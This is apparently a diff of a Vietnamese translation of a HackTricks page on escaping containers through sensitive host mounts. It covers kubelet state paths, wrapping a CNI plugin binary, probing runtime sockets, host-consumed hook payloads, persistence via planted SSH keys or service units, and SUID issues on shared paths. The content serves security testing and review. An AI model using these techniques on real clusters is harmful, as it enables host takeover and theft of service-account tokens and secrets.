+- `/var/lib/kubelet/pods` thường chứa token service-account được chiếu vào và các Secret được mount cho những pod lân cận trên cùng node.
+- `/var/lib/kubelet/pod-resources/kubelet.sock` chủ yếu là bề mặt reconnaissance, nhưng rất hữu ích: nó cho biết pod và container nào hiện đang sử dụng GPU, hugepage, thiết bị SR-IOV và các tài nguyên khan hiếm khác chỉ có trên node.<sup>[[1]](#references)</sup>
+- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` và `/var/lib/kubelet/plugins_registry` cho biết các plugin CSI, DRA và device nào được cài đặt, cũng như những socket mà kubelet dự kiến sẽ giao tiếp. Nếu các thư mục này có quyền ghi thay vì chỉ đọc, phát hiện này trở nên nghiêm trọng hơn nhiều.<sup>[[1]](#references)</sup>
+- `/opt/cni/bin` và `/etc/cni/net.d` nằm ngay trên đường thiết lập mạng pod. Quyền ghi tại đó thường là một primitive thực thi trên host có thể được khai thác sau đó, chứ không chỉ đơn thuần làm lộ cấu hình.<sup>[[2]](#references)</sup>
 
-### Full Example: Writable `/opt/cni/bin`
+### Ví dụ đầy đủ: `/opt/cni/bin` có quyền ghi
 
-If a host CNI binary directory is mounted read-write, replacing a plugin can be enough to obtain host execution the next time the kubelet creates a pod sandbox on that node:<sup>[[2]](#references)</sup>
+Nếu một thư mục nhị phân CNI trên host được mount với quyền đọc-ghi, chỉ cần thay thế một plugin là có thể thực thi mã trên host vào lần tiếp theo kubelet tạo pod sandbox trên node đó:<sup>[[2]](#references)</sup>
 
 ```bash
 plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
@@ -305,11 +305,11 @@ mv "${plugin}.orig" "$plugin"
 rm -f "$(dirname "$plugin")/.cni-triggered"
 ```
 
-This is not as immediate as a mounted `docker.sock`, but it is often more realistic in compromised Kubernetes infrastructure pods. The marker is written beside the mounted plugin so the container can retrieve it even without a host-root or host-`/tmp` mount. The wrapper preserves the original arguments and standard input, then the example restores the original binary. The important point is that the modified binary is later executed by the host network setup flow, not by the current container. Use only a disposable node because an invalid wrapper can prevent new Pod sandboxes from receiving networking.
+Điều này không tức thời như một `docker.sock` được mount, nhưng thường thực tế hơn trong các pod hạ tầng Kubernetes đã bị xâm nhập. Marker được ghi bên cạnh plugin đã mount để container có thể truy xuất nó ngay cả khi không có mount host-root hoặc host-`/tmp`. Wrapper giữ nguyên các đối số ban đầu và đầu vào chuẩn, sau đó ví dụ khôi phục binary ban đầu. Điểm quan trọng là binary đã sửa đổi sẽ được thực thi sau đó bởi luồng thiết lập mạng của host, chứ không phải bởi container hiện tại. Chỉ sử dụng node dùng một lần vì wrapper không hợp lệ có thể khiến các Pod sandbox mới không được cấp mạng.
 
-## Runtime Sockets
+## Socket runtime
 
-Sensitive host mounts often include runtime sockets rather than full directories. These are so important that they deserve explicit repetition here:
+Các mount nhạy cảm trên host thường bao gồm socket runtime thay vì toàn bộ thư mục. Chúng quan trọng đến mức cần được nhắc lại rõ ràng ở đây:
 
 ```text
 /var/run/docker.sock
@@ -322,9 +322,9 @@ Sensitive host mounts often include runtime sockets rather than full directories
 /run/firecracker-containerd.sock
 ```
 
-See [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) for full exploitation flows once one of these sockets is mounted.
+Xem [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) để biết các luồng exploitation đầy đủ sau khi một trong các socket này được mount.
 
-As a quick first interaction pattern:
+Một mẫu tương tác ban đầu nhanh:
 
 ```bash
 docker -H unix:///host/run/docker.sock version 2>/dev/null
@@ -332,15 +332,15 @@ ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
 crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
 ```
 
-If one of these succeeds, the path from "mounted socket" to "start a more privileged sibling container" is usually much shorter than any kernel breakout path.
+Nếu một trong những cách này thành công, con đường từ "socket đã mount" đến "khởi chạy một container ngang hàng có nhiều đặc quyền hơn" thường ngắn hơn nhiều so với bất kỳ con đường thoát khỏi kernel nào.
 
-The same daemon access can also establish **host persistence**. A helper container with a writable host-root bind mount can receive files through `docker cp`, then use `docker exec` to place an SSH key, service unit, or other persistence file under the mounted host path. The security boundary is the daemon's authority to create the host mount; `docker cp` is only a staging step. Audit both newly created containers and writes to host authentication or startup paths after a runtime socket is exposed.
+Quyền truy cập daemon tương tự cũng có thể thiết lập **tính bền vững trên host**. Một container hỗ trợ có bind mount ghi được trỏ đến thư mục gốc của host có thể nhận tệp qua `docker cp`, sau đó dùng `docker exec` để đặt khóa SSH, service unit hoặc tệp duy trì quyền truy cập khác vào đường dẫn host đã mount. Ranh giới bảo mật nằm ở quyền của daemon trong việc tạo mount trên host; `docker cp` chỉ là bước trung chuyển. Hãy kiểm tra cả các container mới được tạo lẫn những lần ghi vào đường dẫn xác thực hoặc khởi động của host sau khi socket runtime bị lộ.
 
-## Writable Host Path Task Hijack
+## Chiếm quyền tác vụ thông qua đường dẫn host có thể ghi
 
-A writable host mount does not need to expose `/` to be dangerous. If the mounted path contains scripts, config files, hooks, plugins, or files consumed later by a host-side scheduled task or service, the container may be able to change what the host executes.
+Một mount host có thể ghi không cần phải để lộ `/` mới nguy hiểm. Nếu đường dẫn được mount chứa script, tệp cấu hình, hook, plugin hoặc các tệp mà tác vụ hay dịch vụ chạy theo lịch phía host sẽ dùng sau đó, container có thể thay đổi nội dung mà host thực thi.
 
-Generic review flow:
+Quy trình rà soát tổng quát:
 
 ```bash
 mount | grep -E ' /host|/mnt|/shared|/opt|/var '
@@ -348,37 +348,37 @@ find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
 grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
 ```
 
-If a writable file is consumed by a host process, keep the payload simple and observable while testing:
+Nếu một tiến trình host sử dụng tệp có quyền ghi, hãy giữ payload đơn giản và dễ quan sát trong quá trình kiểm thử:
 
 ```bash
 printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
 chmod +x /host/path/to/hook.sh
 ```
 
-The interesting part is the trust boundary: the write happens from inside the container, but execution happens later in the host service context. This turns a narrow hostPath or bind mount into a delayed host-code-execution primitive.
+Phần đáng chú ý là ranh giới tin cậy: thao tác ghi diễn ra bên trong container, nhưng việc thực thi xảy ra sau đó trong ngữ cảnh của dịch vụ trên host. Điều này biến một hostPath hoặc bind mount phạm vi hẹp thành primitive thực thi mã trên host có độ trễ.
 
-## Root-Owned Files on a Shared Host Path
+## Tệp do root sở hữu trên host path dùng chung
 
-A container account that can become root may be able to place a root-owned file on a writable path also used by the host. If container UID 0 maps to host UID 0, both views refer to the same file, and the host mount honors SUID execution, a host user who can run a root-owned SUID executable on that path may cross the host privilege boundary. The container does not have to run with `--privileged` for this particular file-ownership issue. See [user namespace mappings](protections/namespaces/user-namespace.md) and the [SUID discussion](privileged-containers.md) for the separate conditions.
+Một tài khoản trong container có thể trở thành root có thể đặt một tệp do root sở hữu trên một path có quyền ghi mà host cũng sử dụng. Nếu UID 0 trong container ánh xạ thành UID 0 trên host, cả hai góc nhìn đều trỏ đến cùng một tệp và host mount cho phép thực thi SUID, người dùng trên host có thể chạy một executable SUID do root sở hữu trên path đó và vượt qua ranh giới đặc quyền của host. Với vấn đề quyền sở hữu tệp cụ thể này, container không cần chạy với `--privileged`. Xem [ánh xạ user namespace](protections/namespaces/user-namespace.md) và [phần thảo luận về SUID](privileged-containers.md) để biết các điều kiện riêng biệt.
 
-Review the path from **both sides**: compare a benign file's ownership and identity, check the container's `uid_map` and `gid_map`, and inspect the host's mount options and execution policy. Container-side `rw` without `nosuid` is only a candidate; it cannot establish host ownership, host mount flags, a host user's access, or whether AppArmor/SELinux blocks execution. `noexec` constrains execution in the view where it applies. The `shared:` and `master:` tags in `/proc/self/mountinfo` describe mount propagation, not whether the file's contents are shared with the host. A bind mount may lack those tags. Credential reuse that provides a host login is a separate step from the shared-file privilege boundary.
+Kiểm tra path từ **cả hai phía**: so sánh quyền sở hữu và danh tính của một tệp vô hại, kiểm tra `uid_map` và `gid_map` của container, đồng thời xem xét các tùy chọn mount và chính sách thực thi trên host. `rw` ở phía container mà không có `nosuid` chỉ là một dấu hiệu cần kiểm tra; nó không thể xác nhận quyền sở hữu trên host, các cờ mount của host, quyền truy cập của người dùng trên host, hoặc liệu AppArmor/SELinux có chặn việc thực thi hay không. `noexec` giới hạn việc thực thi trong góc nhìn mà nó áp dụng. Các thẻ `shared:` và `master:` trong `/proc/self/mountinfo` mô tả sự lan truyền mount, chứ không cho biết nội dung tệp có được chia sẻ với host hay không. Một bind mount có thể không có các thẻ đó. Việc tái sử dụng thông tin xác thực để đăng nhập vào host là bước riêng, không liên quan đến ranh giới đặc quyền của tệp dùng chung.
 
-The host's runtime storage can create a similar path even without an explicit bind mount. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) allowed an unprivileged host user to traverse Docker data subdirectories and execute files from a container filesystem; Moby fixed the permissions in 20.10.9 and notes that running containers must be restarted to correct their directories. Review exact mounted `overlay2/<id>/merged` paths and each parent's search permission, then establish whether container UID 0 maps to host UID 0, a real root-owned SetUID executable is present and reachable, and the host view permits SetUID execution. Rootless or user-namespace-remapped containers, `nosuid`, `noexec`, `no_new_privs`, and MAC policy can change the result. A runtime version or traversable path alone is a review lead, not proof of host-root execution; inspect mount and file metadata without running a candidate executable.
+Bộ lưu trữ của runtime trên host có thể tạo ra path tương tự ngay cả khi không có bind mount tường minh. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) cho phép người dùng không có đặc quyền trên host duyệt qua các thư mục con dữ liệu Docker và thực thi tệp từ filesystem của container; Moby đã sửa quyền trong phiên bản 20.10.9 và lưu ý rằng cần khởi động lại các container đang chạy để sửa các thư mục của chúng. Kiểm tra chính xác các path `overlay2/<id>/merged` đã mount và quyền tìm kiếm của từng thư mục cha, sau đó xác định xem UID 0 trong container có ánh xạ thành UID 0 trên host hay không, có executable SetUID thực sự do root sở hữu và có thể truy cập hay không, và góc nhìn trên host có cho phép thực thi SetUID hay không. Container rootless hoặc dùng user namespace-remapped, `nosuid`, `noexec`, `no_new_privs` và chính sách MAC có thể làm thay đổi kết quả. Phiên bản runtime hoặc path có thể duyệt qua chỉ là dấu hiệu để kiểm tra, không phải bằng chứng rằng có thể thực thi với quyền root trên host; hãy kiểm tra metadata của mount và tệp mà không chạy executable đáng ngờ.
 
-## Mount-Related CVEs
+## CVE liên quan đến mount
 
-Host mounts also intersect with runtime vulnerabilities. Important recent examples include:
+Mount trên host cũng có thể liên quan đến lỗ hổng runtime. Một số ví dụ đáng chú ý gần đây gồm:
 
-- `CVE-2024-21626` in `runc`, where a leaked directory file descriptor could place the working directory on the host filesystem.
-- `CVE-2024-23651`, `CVE-2024-23652`, and `CVE-2024-23653` in BuildKit, where malicious Dockerfiles, frontends, and `RUN --mount` flows could reintroduce host file access, deletion, or elevated privileges during builds.
-- `CVE-2024-1753` in Buildah and Podman build flows, where crafted bind mounts during build could expose `/` read-write.
-- `CVE-2025-47290` in `containerd` 2.1.0, where a TOCTOU during image unpack could let a specially crafted image modify the host filesystem during pull.
+- `CVE-2024-21626` trong `runc`, trong đó một file descriptor của thư mục bị leak có thể đặt thư mục làm việc trên filesystem của host.
+- `CVE-2024-23651`, `CVE-2024-23652` và `CVE-2024-23653` trong BuildKit, trong đó Dockerfile, frontend độc hại và các luồng `RUN --mount` có thể làm xuất hiện lại quyền truy cập tệp trên host, xóa tệp hoặc nâng cao đặc quyền trong quá trình build.
+- `CVE-2024-1753` trong các luồng build của Buildah và Podman, trong đó bind mount được tạo thủ công trong quá trình build có thể để lộ `/` với quyền đọc-ghi.
+- `CVE-2025-47290` trong `containerd` 2.1.0, trong đó lỗi TOCTOU khi giải nén image có thể cho phép một image được tạo đặc biệt sửa đổi filesystem của host trong lúc pull.
 
-These CVEs matter here because they show that mount handling is not only about operator configuration. The runtime itself may also introduce mount-driven escape conditions.
+Các CVE này liên quan ở đây vì chúng cho thấy xử lý mount không chỉ phụ thuộc vào cấu hình của operator. Bản thân runtime cũng có thể tạo ra các điều kiện thoát container do mount gây ra.
 
-## Checks
+## Kiểm tra
 
-Use these commands to locate the highest-value mount exposures quickly:
+Dùng các lệnh sau để nhanh chóng tìm các mount có mức độ phơi nhiễm cao nhất:
 
 ```bash
 mount
@@ -390,30 +390,29 @@ find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
 find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
 ```
 
-What is interesting here:
+Điều đáng chú ý ở đây:
 
-- Host root, `/proc`, `/sys`, `/var`, and runtime sockets are all high-priority findings.
-- Writable proc/sys entries often mean the mount is exposing host-global kernel controls rather than a safe container view.
-- Mounted `/var` paths deserve credential and neighboring-workload review, not just filesystem review.
-- Kubelet state directories and CNI/plugin paths deserve the same priority as runtime sockets because they often sit directly on the node's pod-creation and credential-distribution path.
+- Host root, `/proc`, `/sys`, `/var` và các runtime socket đều là những phát hiện cần ưu tiên cao.
+- Các mục proc/sys có quyền ghi thường cho thấy mount đang để lộ các điều khiển kernel toàn cục của host thay vì một chế độ xem container an toàn.
+- Các đường dẫn `/var` được mount cần được rà soát thông tin xác thực và workload lân cận, không chỉ rà soát filesystem.
+- Các thư mục trạng thái Kubelet và đường dẫn CNI/plugin cần được ưu tiên tương đương runtime socket vì chúng thường nằm ngay trên đường tạo pod và phân phối thông tin xác thực của node.
 
-## Local Validation Status
+## Trạng thái xác thực cục bộ
 
-The practical chains on this page were checked against a local Linux minikube node. The validation reproduced:
+Các chuỗi khai thác thực tế trên trang này đã được kiểm tra trên một node Linux minikube cục bộ. Việc xác thực đã tái hiện được:
 
-- read and write access through a temporary writable hostPath
-- discovery of projected ServiceAccount tokens and mounted Secrets through `/var/lib/kubelet/pods`
-- successful Kubernetes API authentication with a live token recovered from that mounted kubelet state
-- read-only discovery of a neighboring Docker `overlay2` filesystem through mounted `/var`
-- Docker API creation of a sibling container with a read-only host bind through a mounted `docker.sock`
-- delayed host execution through a temporary host-consumed hook
-- a CNI-wrapper simulation that preserved the original plugin's arguments, standard input, and execution
+- quyền đọc và ghi thông qua một hostPath tạm thời có thể ghi
+- phát hiện ServiceAccount token được chiếu và Secrets được mount thông qua `/var/lib/kubelet/pods`
+- xác thực Kubernetes API thành công bằng token còn hiệu lực được khôi phục từ trạng thái kubelet đã mount
+- phát hiện chỉ đọc filesystem `overlay2` của Docker lân cận thông qua `/var` đã mount
+- tạo container cùng cấp bằng Docker API với host bind chỉ đọc thông qua `docker.sock` đã mount
+- thực thi host bị trì hoãn thông qua một hook tạm thời được host tiêu thụ
+- mô phỏng CNI-wrapper vẫn giữ nguyên các đối số, đầu vào chuẩn và quá trình thực thi của plugin gốc
 
-The same node exposed `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore`, and `config.gz`, but it did not expose `uevent_helper`, EFI variables, thermal entries, or `sched_debug`. Destructive kernel triggers were not executed. This confirms that host-root, `/var`, kubelet-state, socket, and host-consumer chains are reproducible, while procfs/sysfs helper techniques must remain conditional on the exact kernel, mount mode, payload path, and trigger.
+Node đó cũng để lộ `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` và `config.gz`, nhưng không để lộ `uevent_helper`, biến EFI, các mục thermal hoặc `sched_debug`. Các trigger kernel có tính phá hoại không được thực thi. Điều này xác nhận rằng các chuỗi khai thác liên quan đến host-root, `/var`, trạng thái kubelet, socket và host-consumer có thể tái hiện được, trong khi các kỹ thuật helper procfs/sysfs phải được xem là có điều kiện tùy theo kernel, chế độ mount, đường dẫn payload và trigger cụ thể.
 
 ## References
 
-- [1] [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
-- [2] [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
-
+- [1] [Các tệp và đường dẫn cục bộ được Kubelet sử dụng](https://kubernetes.io/docs/reference/node/kubelet-files/)
+- [2] [container cilium-agent có thể truy cập host thông qua mount `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
 {{#include ../../../banners/hacktricks-training.md}}
